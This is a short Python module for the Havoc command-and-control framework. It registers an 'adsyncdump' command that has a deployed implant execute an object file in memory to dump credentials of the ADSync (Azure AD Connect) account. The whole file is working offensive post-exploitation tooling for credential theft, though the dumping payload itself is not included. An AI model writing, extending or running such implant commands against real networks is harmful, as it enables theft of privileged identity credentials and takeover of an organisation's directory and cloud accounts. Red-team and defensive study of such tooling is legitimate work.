from havoc import Demon, RegisterCommand


def adsyncdump(demon_id, *param):
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to dump ADSync credentials" )
    demon.InlineExecute(task_id, "go", f"adsyncdump.{demon.ProcessArch}.o", b"", False)

    return task_id


RegisterCommand(adsyncdump, "", "adsyncdump", "Dump credentials of the ADSync account", 0, "", "")
